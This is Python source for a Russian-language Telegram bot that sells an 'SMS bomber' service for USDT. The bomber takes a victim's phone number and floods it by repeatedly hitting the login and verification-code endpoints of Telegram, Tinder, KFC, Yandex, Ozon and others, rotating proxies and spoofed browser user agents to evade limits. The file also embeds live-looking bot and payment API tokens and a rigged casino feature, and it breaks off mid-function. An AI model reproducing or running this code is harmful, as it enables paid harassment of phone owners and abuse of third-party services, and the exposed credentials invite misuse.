import asyncio
import json
import aiohttp
import logging
import random
import string
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, 
    InputFile, ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8523690374:AAE63TIKDU36Vk8xJD_WfZY41bUyA6glrNQ"

CRYPTO_PAY_API = {
    "api_key": "490751:AAIHeBLSx2kKzLeiXp9eTQtx7h33jNtTEpu",
    "base_url": "https://pay.crypt.bot/api/",
    "webhook_secret": "https://my.telegram.org"
}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

moders_id = [8299768278, 7607679022]

PROXIES = [
    {'https': 'https://157.90.181.223:2525'},
    {'http': 'http://192.73.244.36:80'},
    {'http': 'http://198.98.48.76:31280'},
    {'http': 'http://23.247.136.254:80'},
    {'http': 'http://159.65.245.255:80'},
    {'http': 'http://47.251.57.165:1080'},
    {'http': 'http://35.197.89.213:80'},
    {'http': 'http://47.252.29.28:11222'},
    {'http': 'http://36.136.27.2:4999'},
    {'http': 'http://43.229.79.217:3129'},
    {'https': 'https://167.71.177.246:2525'}
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
]

PRICES = {
    "3": {"price": 0.15, "attempts": 3},
    "6": {"price": 0.20, "attempts": 6},
    "9": {"price": 0.24, "attempts": 9},
    "15": {"price": 0.37, "attempts": 15},
    "elite": {"price": 30.0, "attempts": 1900000}
}

class PhoneState(StatesGroup):
    waiting_for_phone = State()

class PromoState(StatesGroup):
    waiting_for_promo = State()

class AdminGiveState(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_attempts = State()

class AdminPromoState(StatesGroup):
    waiting_for_promo_name = State()
    waiting_for_promo_limit = State()
    waiting_for_promo_attempts = State()

class CasinoState(StatesGroup):
    waiting_for_bet = State()

USERS_FILE = "users.json"
PROMOCODES_FILE = "promocodes.json"
TRANSACTIONS_FILE = "transactions.json"
REFERRALS_FILE = "referrals.json"
PENDING_PAYMENTS_FILE = "pending_payments.json"
CRYPTO_INVOICES_FILE = "crypto_invoices.json"
CASINO_STATS_FILE = "casino_stats.json"

def load_data(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_data(filename, data):
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def generate_transaction_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

def get_user_data(user_id):
    users = load_data(USERS_FILE)
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            "attempts": 0,
            "subscription_type": None,
            "used_promocodes": [],
            "referral_code": generate_referral_code(user_id),
            "referrals": [],
            "total_spent": 0,
            "transactions": [],
            "crypto_payments": [],
            "casino_wins": 0,
            "casino_losses": 0,
            "total_bet": 0,
            "total_won": 0
        }
        save_data(USERS_FILE, users)
    return users[user_id_str]

def save_user_data(user_id, data):
    users = load_data(USERS_FILE)
    users[str(user_id)] = data
    save_data(USERS_FILE, users)

def generate_referral_code(user_id):
    return f"REF{user_id}"

class CryptoPaymentSystem:
    def __init__(self):
        self.pending_payments = load_data(PENDING_PAYMENTS_FILE)
        self.crypto_invoices = load_data(CRYPTO_INVOICES_FILE)
    
    async def create_invoice(self, user_id, amount, sub_type):
        headers = {
            'Crypto-Pay-API-Token': CRYPTO_PAY_API["api_key"],
            'Content-Type': 'application/json'
        }
        
        payload = {
            "asset": "USDT",
            "amount": str(amount),
            "description": f"Оплата {sub_type} попыток SMS бомбера",
            "hidden_message": f"UserID: {user_id} | Type: {sub_type}",
            "paid_btn_name": "viewItem",
            "paid_btn_url": f"https://t.me/your_bot_username",
            "payload": json.dumps({"user_id": user_id, "sub_type": sub_type}),
            "allow_comments": False,
            "expires_in": 3600
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{CRYPTO_PAY_API['base_url']}createInvoice",
                    json=payload,
                    headers=headers
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('ok'):
                            invoice = data['result']
                            
                            transaction_id = generate_transaction_id()
                            self.crypto_invoices[invoice['invoice_id']] = {
                                "user_id": user_id,
                                "sub_type": sub_type,
                                "amount": amount,
                                "transaction_id": transaction_id,
                                "status": "active",
                                "created_at": datetime.now().isoformat(),
                                "invoice_url": invoice['pay_url'],
                                "bot_invoice_url": invoice['bot_invoice_url']
                            }
                            
                            self.pending_payments[transaction_id] = {
                                "user_id": user_id,
                                "subscription_type": sub_type,
                                "amount": amount,
                                "status": "pending",
                                "created_at": datetime.now().isoformat(),
                                "crypto_invoice_id": invoice['invoice_id'],
                                "checked_count": 0
                            }
                            
                            save_data(CRYPTO_INVOICES_FILE, self.crypto_invoices)
                            save_data(PENDING_PAYMENTS_FILE, self.pending_payments)
                            
                            return {
                                "success": True,
                                "invoice_url": invoice['pay_url'],
                                "bot_invoice_url": invoice['bot_invoice_url'],
                                "transaction_id": transaction_id,
                                "invoice_id": invoice['invoice_id']
                            }
                    return {"success": False, "error": "Failed to create invoice"}
        except Exception as e:
            logger.error(f"Error creating invoice: {e}")
            return {"success": False, "error": str(e)}
    
    async def check_invoice_status(self, invoice_id):
        headers = {
            'Crypto-Pay-API-Token': CRYPTO_PAY_API["api_key"]
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{CRYPTO_PAY_API['base_url']}getInvoices?invoice_ids={invoice_id}",
                    headers=headers
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('ok') and data['result']['items']:
                            invoice = data['result']['items'][0]
                            return invoice['status']
        except Exception as e:
            logger.error(f"Error checking invoice: {e}")
        
        return "unknown"
    
    async def check_payment_status(self, transaction_id):
        if transaction_id not in self.pending_payments:
            return False
        
        payment = self.pending_payments[transaction_id]
        invoice_id = payment.get("crypto_invoice_id")
        
        if not invoice_id:
            return False
        
        status = await self.check_invoice_status(invoice_id)
        
        if status == "paid":
            payment["status"] = "completed"
            payment["completed_at"] = datetime.now().isoformat()
            
            if invoice_id in self.crypto_invoices:
                self.crypto_invoices[invoice_id]["status"] = "paid"
            
            save_data(PENDING_PAYMENTS_FILE, self.pending_payments)
            save_data(CRYPTO_INVOICES_FILE, self.crypto_invoices)
            return True
        elif status == "expired":
            payment["status"] = "expired"
            save_data(PENDING_PAYMENTS_FILE, self.pending_payments)
            return False
        
        payment["checked_count"] += 1
        save_data(PENDING_PAYMENTS_FILE, self.pending_payments)
        return False
    
    def get_user_pending_payments(self, user_id):
        user_payments = {}
        for tx_id, payment in self.pending_payments.items():
            if payment["user_id"] == user_id and payment["status"] == "pending":
                user_payments[tx_id] = payment
        return user_payments

crypto_payment_system = CryptoPaymentSystem()

class CasinoSystem:
    def __init__(self):
        self.stats = load_data(CASINO_STATS_FILE)
    
    def calculate_multiplier(self):
        rand = random.random() * 100
        
        if rand < 58:
            return 0
        elif rand < 58 + 41:
            return 1
        elif rand < 58 + 41 + 32:
            return 2
        else:
            return 3
    
    def play_casino(self, user_id, bet_amount):
        user_data = get_user_data(user_id)
        
        if user_data["attempts"] < bet_amount:
            return {"success": False, "error": "Недостаточно попыток"}
        
        user_data["attempts"] -= bet_amount
        user_data["total_bet"] += bet_amount
        
        multiplier = self.calculate_multiplier()
        win_amount = bet_amount * multiplier
        
        if multiplier == 0:
            user_data["casino_losses"] += 1
        else:
            user_data["casino_wins"] += 1
            user_data["attempts"] += win_amount
            user_data["total_won"] += win_amount
        
        if "total_plays" not in self.stats:
            self.stats["total_plays"] = 0
            self.stats["total_bet"] = 0
            self.stats["total_won"] = 0
        
        self.stats["total_plays"] += 1
        self.stats["total_bet"] += bet_amount
        self.stats["total_won"] += win_amount
        save_data(CASINO_STATS_FILE, self.stats)
        
        save_user_data(user_id, user_data)
        
        return {
            "success": True,
            "multiplier": multiplier,
            "win_amount": win_amount,
            "new_balance": user_data["attempts"],
            "is_win": multiplier > 0
        }

casino_system = CasinoSystem()

class SMSSystem:
    def __init__(self):
        self.active_attacks = {}
    
    async def send_sms_to_service(self, phone, service_url, session, proxy):
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
        }
        
        try:
            if 'telegram' in service_url:
                payload = {'phone': phone}
            elif 'kfc' in service_url:
                payload = {'phone': f'+{phone}'}
            else:
                payload = {'phone': phone, 'action': 'send_code'}
            
            async with session.post(
                service_url,
                json=payload,
                headers=headers,
                proxy=proxy.get('https') or proxy.get('http'),
                timeout=10
            ) as response:
                return response.status == 200
                
        except Exception as e:
            logger.error(f"Error sending SMS to {service_url}: {e}")
            return False
    
    async def start_sms_attack(self, phone, user_id, message):
        services = [
            "https://my.telegram.org/auth/send_password",
            "https://web.telegram.org/auth/sendCode",
            "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
            "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
            "https://eda.yandex/api/v1/user/request_authentication_code",
            "https://youla.ru/web-api/auth/request_code",
            "https://api.ivi.ru/mobileapi/user/register/phone/v6",
            "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
            "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
        ]
        
        sms_count = 0
        max_sms = 50
        
        async with aiohttp.ClientSession() as session:
            while sms_count < max_sms and self.active_attacks.get(user_id, True):
                proxy = random.choice(PROXIES)
                
                for service_url in services:
                    if not self.active_attacks.get(user_id, True):
                        break
                        
                    success = await self.send_sms_to_service(phone, service_url, session, proxy)
                    sms_count += 1
                    
                    status = "успешен" if success else "не успешен"
                    service_name = service_url.split('/')[2] if '//' in service_url else service_url
                    
                    try:
                        await message.answer(
                            f"✉️ Спам код отправлен\n"
                            f"🗃️ код по счету: {sms_count}\n"
                            f"🔗 сервис: {service_name}\n"
                            f"☎️ номер телефона: {phone}\n"
                            f"❄️ Статус: {status}"
                        )
                    except:
                        pass
                    
                    await asyncio.sleep(random.uniform(2, 5))
                
                await asyncio.sleep(1)
        
        if user_id in self.active_attacks:
            del self.active_attacks[user_id]
        
        try:
            await message.answer(f"✅ SMS атака завершена! Отправлено сообщений: {sms_count}")
        except:
            pass
    
    def stop_attack(self, user_id):
        self.active_attacks[user_id] = False

sms_system = SMSSystem()

def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="⚡ спам отправка смс"), KeyboardButton(text="❄️ купить подписку")],
            [KeyboardButton(text="💖 активация промокода"), KeyboardButton(text="🎰 Казино")],
            [KeyboardButton(text="💎 панель модерации"), KeyboardButton(text="🔮 Реферальная система")],
            [KeyboardButton(text="👤 Ваш профиль")]
        ],
        resize_keyboard=True
    )

@dp.message(Command("start"))
async def start_command(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    if len(args) > 1 and args[1].startswith('ref'):
        referrer_id = int(args[1][3:])
        if referrer_id != user_id:
            referrals = load_data(REFERRALS_FILE)
            if str(user_id) not in referrals:
                referrals[str(user_id)] = referrer_id
                save_data(REFERRALS_FILE, referrals)
                
                referrer_data = get_user_data(referrer_id)
                referrer_data["attempts"] += 1
                referrer_data["referrals"].append(user_id)
                save_user_data(referrer_id, referrer_data)
    
    try:
        photo = InputFile("assets/WelcomeImage/welcome.jpg")
        await message.answer_photo(photo)
    except:
        pass
    
    await message.answer(
        "Добро пожаловать в бота Sms bomber от пользователя @owersz, "
        "данный бот используется для отправки множества кодов на аккаунт телеграм",
        reply_markup=get_main_keyboard()
    )

@dp.message(F.text == "⚡ спам отправка смс")
async def spam_sms_menu(message: types.Message):
    user_id = message.from_user.id
    user_data = get_user_data(user_id)
    
    if user_data["attempts"] <= 0:
        await message.answer("❌ извините но у вас нет купленных попыток", reply_markup=get_main_keyboard())
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✉️ начать спам смс", callback_data="start_spam")],
        [InlineKeyboardButton(text="⏹️ остановить спам", callback_data="stop_spam")],
        [InlineKeyboardButton(text="❄️ обратно в меню", callback_data="back_to_menu")]
    ])
    
    await message.answer(
        f"❄️ Ваше количество попыток: {user_data['attempts']}\n"
        f"🪪 ваш юзернейм: {message.from_user.username}\n"
        f"🆔 ваш айди: {user_id}\n"
        f"💰 Всего потрачено: {user_data.get('total_spent', 0)}₽\n\n"
        f"⚠️ Внимание: 1 запуск = 1 попытка",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "start_spam")
async def start_spam_handler(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    user_data = get_user_data(user_id)
    
    if user_data["attempts"] <= 0:
        await callback.message.answer("❌ Недостаточно попыток!")
        return
    
    user_data["attempts"] -= 1
    save_user_data(user_id, user_data)
    
    await callback.message.answer("❄️ ☎️введите номер телефона (в формате +79991234567):")
    await state.set_state(PhoneState.waiting_for_phone)

@dp.message(PhoneState.waiting_for_phone)
async def process_phone_for_spam(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    user_id = message.from_user.id
    

    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("❌ Неверный формат номера. Используйте формат: +79991234567")
        return
    
    await message.answer(f"🚀 Начинаю SMS атаку на номер: {phone}\n\n⏳ Это может занять несколько минут...")
    
    # Запускаем асинхронную отправку SMS
    sms_system.active_attacks[user_id] = True
    asyncio.create_task(sms_system.start_sms_attack(phone, user_id, message))
    
    await state.clear()

@dp.callback_query(F.data == "stop_spam")
async def stop_spam_handler(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    sms_system.stop_attack(user_id)
    await callback.message.answer("⏹️ SMS атака остановлена")

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_handler(callback: types.CallbackQuery):
    await callback.message.answer("🔙 Возвращаемся в главное меню", reply_markup=get_main_keyboard())

@dp.message(F.text == "❄️ купить подписку")
async def buy_subscription(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="3 попытки - 0.15 USDT", callback_data="sub_3")],
        [InlineKeyboardButton(text="6 попыток - 0.20 USDT", callback_data="sub_6")],
        [InlineKeyboardButton(text="9 попыток - 0.24 USDT", callback_data="sub_9")],
        [InlineKeyboardButton(text="15 попыток - 0.37 USDT", callback_data="sub_15")],
        [InlineKeyboardButton(text="🔮 Элитная навсегда - 30 USDT", callback_data="sub_elite")]
    ])
    
    await message.answer(
        "💎 Выберите тип подписки (оплата в USDT):\n\n"
        "💰 Цены:\n"
        "• 3 попытки - 0.15 USDT\n"
        "• 6 попыток - 0.20 USDT\n"  
        "• 9 попыток - 0.24 USDT\n"
        "• 15 попыток - 0.37 USDT\n"
        "• 🔮 Элитная - 30 USDT (бесконечные попытки)",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("sub_"))
async def handle_subscription(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    sub_type = callback.data.split("_")[1]
    
    if sub_type not in PRICES:
        await callback.message.edit_text("❌ Неверный тип подписки")
        return
    
    price_info = PRICES[sub_type]
    price = price_info["price"]
    attempts = price_info["attempts"]
    
    result = await crypto_payment_system.create_invoice(user_id, price, sub_type)
    
    if not result["success"]:
        await callback.message.edit_text("❌ Ошибка при создании платежа. Попробуйте позже.")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Оплатить через Crypto Bot", url=result["bot_invoice_url"])],
        [InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_payment_{result['transaction_id']}")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data=f"refresh_payment_{result['transaction_id']}")]
    ])
    
    await callback.message.edit_text(
        f"💳 **Оплата подписки через Crypto Pay**\n\n"
        f"📦 Тип: {sub_type} попыток\n"
        f"💰 Сумма: {price} USDT\n"
        f"🎁 Получите: {attempts} попыток\n"
        f"🆔 Транзакция: {result['transaction_id']}\n\n"
        f"⚡ Нажмите '💳 Оплатить' для перехода к оплате\n"
        f"💎 После оплаты нажмите '✅ Проверить оплату'",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("check_payment_"))
async def check_payment(callback: types.CallbackQuery):
    transaction_id = callback.data.split("_")[2]
    user_id = callback.from_user.id
    
    is_paid = await crypto_payment_system.check_payment_status(transaction_id)
    
    if is_paid:
        payment_data = crypto_payment_system.pending_payments[transaction_id]
        sub_type = payment_data["subscription_type"]
        
        user_data = get_user_data(user_id)
        price_info = PRICES[sub_type]
        attempts = price_info["attempts"]
        
        user_data["attempts"] += attempts
        user_data["total_spent"] += payment_data["amount"]
        user_data["transactions"].append(transaction_id)
        user_data["crypto_payments"].append({
            "transaction_id": transaction_id,
            "amount": payment_data["amount"],
            "sub_type": sub_type,
            "date": datetime.now().isoformat()
        })
        
        if sub_type == "elite":
            user_data["subscription_type"] = "elite"
        
        transactions = load_data(TRANSACTIONS_FILE)
        transactions[transaction_id] = {
            "user_id": user_id,
            "subscription_type": sub_type,
            "attempts_given": attempts,
            "amount": payment_data["amount"],
            "currency": "USDT",
            "status": "completed",
            "timestamp": datetime.now().isoformat(),
            "payment_method": "crypto_pay"
        }
        save_data(TRANSACTIONS_FILE, transactions)
        
        save_user_data(user_id, user_data)
        
        await callback.message.edit_text(
            f"✅ **Оплата подтверждена!** 🔮\n\n"
            f"🆔 ваш ID: {user_id}\n"
            f"🪪 ваш username: {callback.from_user.username}\n"
            f"⚡ получено попыток: {attempts}\n"
            f"💰 потрачено: {payment_data['amount']} USDT\n"
            f"💎 Общий баланс попыток: {user_data['attempts']}"
        )
    else:
        payment_data = crypto_payment_system.pending_payments.get(transaction_id, {})
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить", url=payment_data.get("invoice_url", "https://t.me/your_bot_username"))],
            [InlineKeyboardButton(text="🔄 Проверить снова", callback_data=f"check_payment_{transaction_id}")],
        ])
        
        status_msg = "Ожидание оплаты"
        if payment_data.get("status") == "expired":
            status_msg = "Платеж просрочен"
        
        await callback.message.edit_text(
            f"⏳ **Статус платежа: {status_msg}**\n\n"
            f"🆔 Транзакция: {transaction_id}\n"
            f"💳 Статус: {payment_data.get('status', 'pending')}\n"
            f"🔍 Проверок: {payment_data.get('checked_count', 0)}\n\n"
            f"Если вы уже оплатили, подождите несколько минут и проверьте снова.",
            reply_markup=keyboard
        )

@dp.message(F.text == "💖 активация промокода")
async def activate_promo(message: types.Message, state: FSMContext):
    try:
        photo = InputFile("assets/PromocodeImage/promo.jpg")
        await message.answer_photo(photo)
    except:
        pass
    
    await message.answer("Введите промокод:")
    await state.set_state(PromoState.waiting_for_promo)

@dp.message(PromoState.waiting_for_promo)
async def process_promo(message: types.Message, state: FSMContext):
    promo_code = message.text.strip()
    user_id = message.from_user.id
    
    promocodes = load_data(PROMOCODES_FILE)
    user_data = get_user_data(user_id)
    
    if promo_code not in promocodes:
        await message.answer("❌ данный промокод не существует", reply_markup=get_main_keyboard())
        await state.clear()
        return
    
    promo_data = promocodes[promo_code]
    
    if len(promo_data["activated_by"]) >= promo_data["limit"]:
        await message.answer("🫡 промокод слишком устарел и просрочен!", reply_markup=get_main_keyboard())
        await state.clear()
        return
    
    if user_id in promo_data["activated_by"]:
        await message.answer("❌ вы уже активировали этот промокод(", reply_markup=get_main_keyboard())
        await state.clear()
        return
    
    promo_data["activated_by"].append(user_id)
    user_data["attempts"] += promo_data["attempts"]
    user_data["used_promocodes"].append(promo_code)
    
    save_data(PROMOCODES_FILE, promocodes)
    save_user_data(user_id, user_data)
    
    await message.answer(
        f"✅ промокод был активирован успешно\n"
        f"🪪 ваш юзернейм: {message.from_user.username}\n"
        f"🆔 ваш айди: {user_id}\n"
        f"⚡ получено попыток: {promo_data['attempts']}\n"
        f"💎 Общий баланс: {user_data['attempts']}",
        reply_markup=get_main_keyboard()
    )
    await state.clear()

@dp.message(F.text == "🎰 Казино")
async def casino_menu(message: types.Message):
    user_data = get_user_data(message.from_user.id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎰 Сделать ставку", callback_data="make_bet")],
        [InlineKeyboardButton(text="📊 Статистика казино", callback_data="casino_stats")]
    ])
    
    await message.answer(
        f"🎰 **Добро пожаловать в казино** 🔱\n"
        f"🛡️ Все имеет мощный гарант и высокий шанс ⚡\n\n"
        f"💎 Ваш баланс: {user_data['attempts']} попыток\n"
        f"🎲 Ваша статистика:\n"
        f"• Побед: {user_data['casino_wins']}\n"
        f"• Поражений: {user_data['casino_losses']}\n"
        f"• Всего выиграно: {user_data['total_won']} попыток",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "make_bet")
async def make_bet(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("🎰 Введите ставку в попытках:")
    await state.set_state(CasinoState.waiting_for_bet)

@dp.message(CasinoState.waiting_for_bet)
async def process_bet(message: types.Message, state: FSMContext):
    try:
        bet_amount = int(message.text)
        user_id = message.from_user.id
        user_data = get_user_data(user_id)
        
        if bet_amount <= 0:
            await message.answer("❌ Ставка должна быть больше 0!", reply_markup=get_main_keyboard())
            await state.clear()
            return
        
        if user_data["attempts"] < bet_amount:
            await message.answer("❌ Недостаточно попыток для ставки!", reply_markup=get_main_keyboard())
            await state.clear()
            return
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔮 Готов крутить", callback_data=f"spin_{bet_amount}")]
        ])
        
        await message.answer(
            f"🎰 Вы поставили цену в: {bet_amount} попытках 🔱\n"
            f"💎 Ваш текущий баланс: {user_data['attempts']}\n\n"
            f"Готовы крутить барабан?",
            reply_markup=keyboard
        )
        await state.clear()
        
    except ValueError:
        await message.answer("❌ Введите корректное число!", reply_markup=get_main_keyboard())
        await state.clear()

@dp.callback_query(F.data.startswith("spin_"))
async def spin_casino(callback: types.CallbackQuery):
    bet_amount = int(callback.data.split("_")[1])
    user_id = callback.from_user.id
    
    await callback.message.edit_text("🎁 Прокручиваем барабан... ⏳")
    await asyncio.sleep(2)
    
    result = casino_system.play_casino(user_id, bet_amount)
    
    if not result["success"]:
        await callback.message.edit_text(f"❌ {result['error']}")
        return
    
    multiplier = result["multiplier"]
    win_amount = result["win_amount"]
    new_balance = result["new_balance"]
    
    if multiplier == 0:
        await callback.message.edit_text(
            f"🔱 **Жаль но удача не вашей стороне**\n\n"
            f"🎰 Множитель: x{multiplier}\n"
            f"💸 Вы проиграли: {bet_amount} попыток\n"
            f"💎 Новый баланс: {new_balance} попыток\n\n"
            f"💔 Не расстраивайтесь, попробуйте еще раз!"
        )
    else:
        await callback.message.edit_text(
            f"🍀 **Вы победили!** 🎉\n\n"
            f"🎰 Множитель: x{multiplier}\n"
            f"💰 Выигрыш: {win_amount} попыток\n"
            f"💎 Новый баланс: {new_balance} попыток\n\n"
            f"❄️ Смотри не депни все )"
        )

# ========== ПАНЕЛЬ МОДЕРАЦИИ ==========
@dp.message(F.text == "💎 панель модерации")
async def mod_panel(message: types.Message):
    user_id = message.from_user.id
    
    if user_id not in moders_id:
        await message.answer(
            f"💻 ваш ID: {user_id}, не был найден в списке модерации :D, "
            f"💎 вы можете написать @owersz и оплатить звездами ему за добавление в модерацию",
            reply_markup=get_main_keyboard()
        )
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 выдать себе подписку", callback_data="give_self")],
        [InlineKeyboardButton(text="💝 выдать подписку другу", callback_data="give_friend")],
        [InlineKeyboardButton(text="💾 создать промокод", callback_data="create_promo")],
        [InlineKeyboardButton(text="📊 статистика", callback_data="admin_stats")]
    ])
    
    await message.answer(
        "💎 Добро пожаловать в панель модераторов 🗃️\n"
        "Вы можете выдавать попытки и создавать промокоды!",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "give_friend")
async def give_friend(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("🪪 Введите айди вашего друга:")
    await state.set_state(AdminGiveState.waiting_for_user_id)

@dp.message(AdminGiveState.waiting_for_user_id)
async def process_friend_id(message: types.Message, state: FSMContext):
    try:
        friend_id = int(message.text)
        await state.update_data(friend_id=friend_id)
        await message.answer("🗃️ Введите количество попыток для выдачи: ❄️")
        await state.set_state(AdminGiveState.waiting_for_attempts)
    except ValueError:
        await message.answer("❌ Неверный формат ID. Введите числовой ID:")

@dp.message(AdminGiveState.waiting_for_attempts)
async def process_friend_attempts(message: types.Message, state: FSMContext):
    try:
        attempts = int(message.text)
        data = await state.get_data()
        friend_id = data['friend_id']
        
        friend_data = get_user_data(friend_id)
        friend_data["attempts"] += attempts
        save_user_data(friend_id, friend_data)
        
        await message.answer(
            f"✅ Успешно выдано {attempts} попыток пользователю {friend_id}\n"
            f"💎 Новый баланс: {friend_data['attempts']}",
            reply_markup=get_main_keyboard()
        )
        await state.clear()
    except ValueError:
        await message.answer("❌ Неверный формат. Введите число:")

@dp.callback_query(F.data == "create_promo")
async def create_promo(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("🖥️ Введите промокод: 🌐")
    await state.set_state(AdminPromoState.waiting_for_promo_name)

@dp.message(AdminPromoState.waiting_for_promo_name)
async def process_promo_name(message: types.Message, state: FSMContext):
    promo_name = message.text.strip()
    await state.update_data(promo_name=promo_name)
    await message.answer("💖 Введите количество активаций до этого промокода:")
    await state.set_state(AdminPromoState.waiting_for_promo_limit)

@dp.message(AdminPromoState.waiting_for_promo_limit)
async def process_promo_limit(message: types.Message, state: FSMContext):
    try:
        limit = int(message.text)
        await state.update_data(promo_limit=limit)
        await message.answer("⌨️ Введите количество попыток сколько пользователи могут получать их:")
        await state.set_state(AdminPromoState.waiting_for_promo_attempts)
    except ValueError:
        await message.answer("❌ Неверный формат. Введите число:")

@dp.message(AdminPromoState.waiting_for_promo_attempts)
async def process_promo_attempts(message: types.Message, state: FSMContext):
    try:
        attempts = int(message.text)
        data = await state.get_data()
        
        promocodes = load_data(PROMOCODES_FILE)
        promocodes[data['promo_name']] = {
            "limit": data['promo_limit'],
            "attempts": attempts,
            "activated_by": []
        }
        save_data(PROMOCODES_FILE, promocodes)
        
        await message.answer(
            f"✅ Промокод создан успешно!\n"
            f"🔮 Промокод: {data['promo_name']}\n"
            f"🌐 Лимит активаций: {data['promo_limit']}\n"
            f"⚡ Количество попыток: {attempts}",
            reply_markup=get_main_keyboard()
        )
        await state.clear()
    except ValueError:
        await message.answer("❌ Неверный формат. Введите число:")

@dp.message(F.text == "🔮 Реферальная система")
async def referral_system(message: types.Message):
    user_id = message.from_user.id
    user_data = get_user_data(user_id)
    
    referral_link = f"https://t.me/RareSmsBombRobot?start=ref{user_id}"
    
    await message.answer(
        f"🔮 Ваша реферальная ссылка:\n`{referral_link}`\n\n"
        f"💎 Приглашено пользователей: {len(user_data.get('referrals', []))}\n"
        f"⚡ Получено попыток: {len(user_data.get('referrals', []))}",
        reply_markup=get_main_keyboard()
    )

@dp.message(F.text == "👤 Ваш профиль")
async def user_profile(message: types.Message):
    user_id = message.from_user.id
    user_data = get_user_data(user_id)
    
    elite_status = "✅ активен" if user_data.get("subscription_type") == "elite" else "❌ не активен"
    moderator_status = "✅ активен" if user_id in moders_id else "❌ не активен"
    
    transactions_text = "❌ не покупали подписку ни разу"
    if user_data.get("transactions"):
        transactions_text = f"{len(user_data['transactions'])} покупок"
    
    crypto_payments_count = len(user_data.get("crypto_payments", []))
    
    used_promos = ", ".join(user_data.get("used_promocodes", [])) if user_data.get("used_promocodes") else "нет"
    
    total_games = user_data["casino_wins"] + user_data["casino_losses"]
    win_rate = (user_data["casino_wins"] / total_games * 100) if total_games > 0 else 0
    
    profile_text = (
        f"👤 **Ваш профиль**\n\n"
        f"🆔 Ваш ID: `{user_id}`\n"
        f"🪪 Ваш username: @{message.from_user.username}\n"
        f"🗃️ Количество попыток: {user_data['attempts']}\n"
        f"💾 Активировали промокоды: {used_promos}\n"
        f"🔮 Элитный статус: {elite_status}\n"
        f"💎 Покупок: {transactions_text}\n"
        f"💰 Крипто платежей: {crypto_payments_count}\n"
        f"💻 Статус модератора: {moderator_status}\n\n"
        f"🎰 **Статистика казино:**\n"
        f"• 🎲 Игр: {total_games}\n"
        f"• ✅ Побед: {user_data['casino_wins']}\n"
        f"• 📈 Винрейт: {win_rate:.1f}%\n"
        f"• 💰 Выиграно: {user_data['total_won']} попыток\n\n"
        f"🛡️ Купить подписку через Crypto Pay (USDT) - надежно и анонимно!\n\n"
        f"🌐 По поводу добавления в модерацию: @owersz"
    )
    
    await message.answer(profile_text, reply_markup=get_main_keyboard())

async def main():
    os.makedirs("assets/WelcomeImage", exist_ok=True)
    os.makedirs("assets/PromocodeImage", exist_ok=True)
    
    initialize_files()
    
